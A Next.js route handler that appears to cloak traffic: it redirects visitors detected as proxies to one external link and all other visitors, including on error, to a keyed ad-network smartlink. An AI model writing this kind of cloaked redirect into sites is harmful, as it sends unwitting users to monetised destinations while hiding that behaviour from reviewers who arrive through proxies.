import { NextRequest, NextResponse } from 'next/server';
import { checkForProxy, getClientIP } from '@/lib/proxy-checker';

export async function GET(req: NextRequest) {
  try {
    const ip = getClientIP(req);
    const isProxy = await checkForProxy(ip);

    if (isProxy) {
      const proxyUrl = 'https://heavenly-holiday.com/zAvjDd';
      return NextResponse.redirect(proxyUrl);
    } else {
      const normalUrl = 'https://www.effectivegatecpm.com/xqij18jxsg?key=c3c280e305e2ea78f585e61716e4aa57';
      return NextResponse.redirect(normalUrl);
    }
  } catch (error) {
    console.log(error);
    
    const normalUrl = 'https://www.effectivegatecpm.com/xqij18jxsg?key=c3c280e305e2ea78f585e61716e4aa57';
    return NextResponse.redirect(normalUrl);
  }
}